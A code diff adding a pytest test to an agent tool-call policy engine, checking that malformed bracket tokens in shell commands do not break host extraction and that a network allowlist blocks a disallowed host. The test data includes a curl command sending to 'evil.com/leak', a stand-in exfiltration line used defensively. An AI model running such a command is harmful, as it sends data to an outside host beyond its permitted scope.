@@ -362,6 +362,26 @@ def test_policy_engine_enforces_network_allowlist_for_shell_command_urls() -> No
         )
 
 
+def test_policy_engine_ignores_malformed_ipv6_like_shell_tokens() -> None:
+    """Malformed bracket tokens in shell command should not crash host extraction."""
+
+    engine = PolicyEngine()
+    policy = _policy(network_allowlist_json='["example.com"]')
+
+    engine.ensure_tool_call_allowed(
+        policy=policy,
+        tool_name="bash.exec",
+        params={"cmd": "curl [oops[ https://api.example.com/v1"},
+    )
+
+    with pytest.raises(PolicyViolationError, match="Network host is not allowed by policy: evil.com"):
+        engine.ensure_tool_call_allowed(
+            policy=policy,
+            tool_name="bash.exec",
+            params={"cmd": "curl [oops[ https://evil.com/leak"},
+        )
+
+
 def test_policy_engine_enforces_network_allowlist_for_shell_ssh_hosts() -> None:
     """Network allowlist should apply to SSH hosts found inside shell commands."""
 
